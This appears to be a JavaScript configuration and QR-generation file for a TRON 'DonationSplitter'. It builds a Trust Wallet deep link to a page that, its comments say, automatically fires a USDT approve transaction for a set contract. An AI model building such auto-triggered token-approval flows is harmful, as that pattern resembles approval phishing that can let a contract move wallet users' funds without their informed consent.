// ============================================================
// CONFIGURATION
// ============================================================

const CONFIG = {
    // Your deployed DonationSplitter contract address (Base58)
    CONTRACT_ADDRESS: "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju",

    // USDT TRC20 contract on TRON mainnet
    USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",

    // 1 USDT = 1,000,000 (6 decimals)
    APPROVE_AMOUNT: "1000000",
};

// ============================================================
// BUILD THE APPROVE QR CODE
// ============================================================

/**
 * Generates a TronLink-compatible deep link QR code.
 * When scanned with Trust Wallet, it opens the DApp browser
 * which triggers the approve transaction.
 *
 * Trust Wallet recognizes this format:
 * https://link.trustwallet.com/open_url?coin_id=195&url=<encoded_url>
 *
 * The URL points to a page that auto-triggers approve via injected tronWeb.
 */
function generateApproveQR() {
    // The QR encodes a URL that Trust Wallet will open in its DApp browser.
    // That page (approve.html) auto-triggers the approve transaction.
    const approvePageUrl = window.location.origin + "/approve.html";
    const trustWalletDeepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(approvePageUrl)}`;

    const qrcodeContainer = document.getElementById("qrcode");
    qrcodeContainer.innerHTML = "";

    new QRCode(qrcodeContainer, {
        text: trustWalletDeepLink,
        width: 200,
        height: 200,
        colorDark: "#000000",
        colorLight: "#ffffff",
        correctLevel: QRCode.CorrectLevel.M,
    });

    // Set mobile link
    document.getElementById("mobile-link").href = trustWalletDeepLink;
}

// Initialize
generateApproveQR();
